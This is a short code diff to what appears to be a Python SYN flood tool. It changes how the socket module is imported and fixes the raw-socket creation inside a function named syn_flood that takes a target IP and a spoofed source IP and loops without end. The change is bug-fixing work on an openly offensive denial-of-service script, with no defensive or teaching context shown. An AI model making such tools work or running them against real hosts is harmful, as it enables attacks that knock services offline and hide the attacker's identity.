@@ -3,7 +3,7 @@ from time import sleep
 from requests import get as requests_get
 from time import localtime, strftime
 import threading
-import socket
+import socket as sock_module
 import random
 from struct import pack
 from socket import AF_INET, SOCK_RAW, IPPROTO_TCP, IP_HDRINCL, inet_aton, htons
@@ -57,7 +57,7 @@ def checksum(psh):
     return s
 
 def syn_flood(target_ip, fake_ip):
-    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+    sock = sock_module.socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
     sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
     
     while True:
